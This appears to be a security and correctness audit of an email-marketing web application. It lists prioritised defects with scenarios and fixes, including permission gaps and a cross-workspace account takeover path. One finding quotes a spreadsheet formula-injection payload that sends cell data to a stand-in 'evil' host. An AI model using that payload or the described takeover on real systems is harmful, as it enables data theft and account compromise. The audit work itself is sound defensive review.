## High priority

### 1. [HIGH, security] Contact-to-audience endpoints check the wrong permission
- **Where:** `app/Http/Controllers/ContactAudienceController.php:22` and `:37`, plus `StoreContactAudienceRequest::authorize`
- **Defect:** these endpoints only check `update` on the Contact, which needs the contact-management permission. Creating or deleting a subscriber everywhere else needs audience permissions (`SubscriberPolicy` create/delete, and `importableAudiences()` in the contact import controller).
- **Scenario:**
  - A custom role with contact access but no audience access can add any contact to any audience, and that triggers automations.
  - The same role can hard-delete subscriber rows (`DELETE contacts/{c}/audiences/{s}`). That wipes unsubscribe history, so the person can be added again and mailed.
- **Fix:**
  - In `store`, add `Gate::authorize('create', [Subscriber::class, $audience])`.
  - In `destroy`, add `Gate::authorize('delete', $subscriber)`.
- **Tests:** none yet. Add a test for a role with contact access but no audience access, for both store and destroy.

### 2. [MED, security] Workspace admins can take over other users' whole accounts
- **Where:** `app/Http/Controllers/Teams/TeamMemberController.php:125-139` (`generatePassword`) and `sendPasswordResetLink`
- **Defect:** both only refuse users who own *this* workspace. The password applies to the whole account, not one workspace.
- **Scenario:** an admin of workspace A generates a password for a member who owns workspace B, logs in as them, and controls B.
- **Fix:**
  - Refuse any target who is an owner (or holds a role above the actor's) in *any* workspace.
  - Also refuse any target who belongs to a workspace the actor isn't in.
  - Update `.ai/rules/http-controllers-teams.md`; it currently only covers the selected workspace's owner.

### 3. [MED-HIGH] The stalled-delivery sweeper duplicates queued jobs on long campaigns
- **Where:** `app/Console/Commands/ResumeEmailDeliveriesCommand.php:87-105` (`requeueCampaignDeliveries`), and `:204` (`requeueTransactionalDeliveries`)
- **Defect:** the sweeper re-dispatches any delivery that is Queued, has never been attempted, and has `updated_at` older than 15 minutes. A delivery that is just waiting its turn looks the same as one whose job was lost. The re-dispatched jobs also run outside the campaign batch.
- **Scenario:** a 100k-recipient campaign at 14/s takes about 2 hours. From minute 15, every 5-minute sweep dispatches up to ~85k duplicate jobs.
  - The claim prevents double sends.
  - The problem is the rate limiter, which counts each job *before* it runs. Each duplicate uses up a send slot and then exits without sending.
  - Throughput collapses, more rows look stalled, and the loop feeds itself.
- **Fix:**
  - Only re-queue when no batch job is left. Use the same "batch finished/abandoned and campaign queue empty" check `closeFinishedCampaigns` already uses.
  - Or record a dispatched-at timestamp and use it instead of `updated_at`.
- **Test:** "a queued delivery inside a live batch is not re-dispatched".

### 4. [MED-HIGH] One transport error permanently fails an automation run
- **Where:** `app/Actions/Automations/AdvanceAutomationRun.php:98-104` and `:200-228`
- **Defect:** `execute()` sits inside a `catch (Throwable)` that calls `fail()` and returns. So the `$tries = 3` and backoff `[30, 120, 300]` in `ProcessAutomationRun` never take effect. Every transient error is also counted against the address's health.
- **Scenario:** an SMTP or SES timeout or throttle on a "send email" step fails the run and cancels every later step. A provider outage wipes out every run that reaches a send step during it.
- **Fix:**
  - On `EmailTransportException`, mark the delivery Failed and release the step back to `pending`. The `releaseStep()` the rules file mentions does not exist.
  - Then rethrow, so the queue retries with backoff. `ProcessAutomationRun::failed()` already handles the final failure.
- **Test:** a transport failure on an automation send step, in `AutomationEmailDeliveryTest.php`.

### 5. [MED] Automation emails skip the send-rate limit
- **Where:** `AdvanceAutomationRun.php:200`, `app/Jobs/ProcessAutomationRun.php`
- **Defect:** automation mail goes straight to `TeamMailer::sendResolved` without `ThrottlesEmailDelivery`. `config/delivery.php` says the limit covers everything handed to the transport.
- **Scenario:** an import or segment sync triggers a "subscribed" automation for 10k contacts. They burst past SES's 14/s and get throttled, and because of #4 those runs fail permanently.
- **Fix:** apply `ThrottlesEmailDelivery` to `ProcessAutomationRun`, or move sends into their own throttled job.
- **Test:** automation sends respect the rate limit.

## Medium

### 6. Segment "not equals" / "does not contain" rules drop rows with empty fields
- **Where:** `app/Actions/Audiences/ApplySegmentRules.php:57-58`, `:76`
- **Defect:** `LOWER(NULL) != ?` and `subscribe_form_id != ?` evaluate to NULL in SQL, so those rows never match.
- **Scenario:** "first name does not contain *test*" leaves out everyone with no first name. "Subscribe form is not X" leaves out every manual, import and API subscriber. The uncommitted diff already fixes this for Language (`:66`).
- **Fix:** add the same `orWhereNull($column)` wrapping for names and subscribe form, with a test for each.

### 7. The contact import report CSV doesn't neutralise spreadsheet formulas
- **Where:** `app/Http/Controllers/ContactImportController.php:227-240`
- **Defect:** raw values from failed rows are written with `fputcsv`. The exports use `ContactExportController::sanitizeCsvRow` (`:224`); this report does not.
- **Scenario:** an email cell `=hyperlink("http://evil/?"&a1,"x")` fails validation, lands in the report, and runs as a formula when a teammate opens the report in Excel.
- **Fix:** move the sanitiser to a shared helper, apply it to every report cell, and add a test.

### 8. The allowed-languages list isn't enforced on dashboard adds or CSV imports
- **Where:** `app/Http/Requests/SaveSubscriberRequest.php:61`, `app/Jobs/ProcessContactImport.php:411-417`
- **Defect:** these only check that the language is supported. The public form (`PublicSubscribeRequest:55`) and the API (`SubscribeSubscriberRequest:43`) also check `Rule::in($audience->allowed_languages)`.
- **Fix:** add `Rule::in($audience->allowed_languages ?? [])` to the request, and reject or flag import rows with a language outside the list.

### 9. Saved-section dialogs can hang on a spinner
- **Where:** `resources/js/components/saved-sections-group.tsx:55-80`
- **Defect:** `send()` wraps a non-async `router.visit` in a Promise that only settles on success or error. It has no `onCancel` or `onFinish`.
- **Scenario:**
  - Clicking the page's Save while a "Save as section" or Rename request is in flight cancels the section visit, and the dialog stays busy forever.
  - The reverse also happens: a section save started while the draft is saving cancels the draft save without telling the user.
- **Fix:** add `async: true` to the visit, and settle the Promise in `onCancel` / `onFinish`. Or use `useHttp` plus `router.reload({ only: ['savedSections'] })`.

### 10. Image upload keeps polling after you leave the editor
- **Where:** `resources/js/lib/editor-media-upload.ts:85-110`
- **Defect:** the poll runs for up to 45 seconds with no way to cancel it. It then calls `router.reload({ only: ['mediaLibrary'] })` on whatever page is showing by then.
- **Fix:** accept an `AbortSignal` (or return a cancel function) and abort on unmount. Only reload if the page that started the upload is still showing.

## Low

11. **An automation run can get stuck at Running after a successful send.**
    - **Where:** `AdvanceAutomationRun.php:106-121`
    - **Defect:** the step is claimed before the send. If the worker dies after sending, the run stays `running`, and `automations:resume` only picks up Waiting runs. This is already documented as known in `.ai/rules/automations-jobs.md`.
    - **Fix:** have the sweeper fail runs that have been `running` past a staleness threshold. Do not re-send them.
12. **Transactional merge-tag preprocessing rewrites the whole HTML body (uncommitted).**
    - **Where:** `app/Actions/Transactional/RenderTransactionalContent.php:111-153`
    - **Defect:** `decodeEncodedTags` and `hydrateMarkdownMergeLinks` act on all of the HTML, including attributes, `<code>` and `<pre>`.
    - **Fix:** limit both to `href` values, or do the work during the Markdown-to-HTML step.
13. **A malformed audience UUID returns a 500 on Postgres.**
    - **Where:** `app/Http/Requests/Api/SubscribeSubscriberRequest.php:82`, `UnsubscribeSubscriberRequest.php:44`
    - **Fix:** add `->whereUuid('audience')` to the routes in `routes/api.php`, or a `Str::isUuid` guard.
14. **Wildcards in segment "contains" values aren't escaped.**
    - **Where:** `ApplySegmentRules.php:59-60`
    - **Defect:** "contains `_`" matches everyone.
    - **Fix:** escape `%` and `_` and add an `ESCAPE` clause.
15. **The segment deletion check can race with scheduling.**
    - **Where:** `app/Actions/Audiences/DeleteSegment.php:22-38`
    - **Defect:** a campaign scheduled at the same moment can lose its segment, and the send then widens to the whole audience.
    - **Fix:** do the check and the delete in a transaction with `lockForUpdate` on the matching `emails` rows.
16. **Stale pnpm release-age exclusion.**
    - **Where:** `pnpm-workspace.yaml:10-11`
    - **Defect:** it still excludes `@maildun/email-builder@0.1.0`, but the project now uses `^0.3.0`.
    - **Fix:** change it to `0.3.0`, or remove it.
17. **Overrides are declared twice.**
    - **Where:** `package.json:89-92` and `pnpm-workspace.yaml:27-30`
    - **Fix:** keep them only in `pnpm-workspace.yaml`.
18. **Image-picker logic is duplicated.**
    - **Where:** `pages/transactional/edit.tsx:200-319`, `pages/email-templates/edit.tsx`, `pages/emails/edit.tsx`
    - **Fix:** move it into a shared `useBuilderMediaPicker` hook.
19. **Media library and saved sections are shown based on the workspace setting, not the email's own editor.**
    - **Where:** `TransactionalEmailController.php:154-159`, `EmailController.php:348-353`
    - **Defect:** they depend on `$currentTeam->email_editor`.
    - **Fix:** check `$email->editor` / `$transactionalEmail->editor` instead.

## Checked and found sound

- **Sending:** campaign claims and releases, the stop-send race, the sweeper's handling of claimed deliveries, and `claimDue` for scheduled sends.
- **Webhooks and links:** SES webhook signature, certificate host, topic allowlist and per-tenant scoping. Unsubscribe and tracking routes are signed. The link checker blocks private IPs on every redirect hop.
- **Team scoping:** all `{current_team}` routes use scoped bindings, the API v1 is scoped to the key's team, and MCP checks workspace membership and policies before every change.
- **Uploads and fetches:** favicon fetches have no SSRF risk, media uploads accept raster images only, and the `.xls` export writes cells as text.
- **Frontend:** no `dangerouslySetInnerHTML` with email HTML, email-preview iframes are sandboxed, the code uses Wayfinder routes, and there is no use of APIs removed in Inertia v3.
